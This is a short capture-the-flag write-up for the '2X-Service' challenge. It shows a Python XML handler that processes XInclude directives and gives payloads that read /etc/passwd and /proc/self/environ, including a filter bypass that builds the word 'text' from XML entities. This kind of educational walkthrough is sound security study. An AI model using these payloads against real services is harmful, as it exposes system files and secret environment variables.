<h1>2X-Service</h1>

<p>{% file src="../../.gitbook/assets/app.py" %}</p>

<p>This challenge revolves around an XML parser:</p>

<p><code>python
@socketio.on('message')
def handle_message(xpath, xml):
    if len(xpath) != 0 and len(xml) != 0 and "text" not in xml.lower():
        try:
            res = ''
            root = ElementTree.fromstring(xml.strip())
            ElementInclude.include(root)
            for elem in root.findall(xpath):
                if elem.text != "":
                    res += elem.text + ", "
            emit('result', res[:-2])
        except Exception as e:
            emit('result', 'Nani?')
    else:
        emit('result', 'Nani?')
</code></p>

<p>Notice that <code>ElementInclude.include(root)</code> is used, which allows <a href="https://www.w3.org/TR/xinclude/">XInclude directives</a>.</p>

<p>XInclude directives allow the parsing of files as either <code>text</code> or <code>xml</code>. For example, the following will include the contents of <code>/etc/passwd</code> as part of the results.</p>

<p><code>markup
&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
    &lt;xi:include parse="text" href="/etc/passwd"/&gt;
&lt;/foo&gt;
</code></p>

<p>However, the server checks that <code>"text" not in xml.lower()</code>. This poses a problem, because <code>parse="xml"</code> will raise an error when used with non-XML content like <code>/etc/passwd</code>. To get around this, we can simply define XML entities, then combine them to form the string <code>text</code>:</p>

<p><code>markup
&lt;!DOCTYPE data [
    &lt;!ENTITY a0 "te" &gt;
    &lt;!ENTITY a1 "xt" &gt;
]&gt;
&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
    &lt;xi:include parse="&amp;a0;&amp;a1;" href="/etc/passwd"/&gt;
&lt;/foo&gt;
</code></p>

<p>The flag was in the environment variable, so we read <code>/proc/self/environ</code> to get</p>

<p><code>FLAG=TetCTF{Just_Warm_y0u_uP_:P__}</code></p>
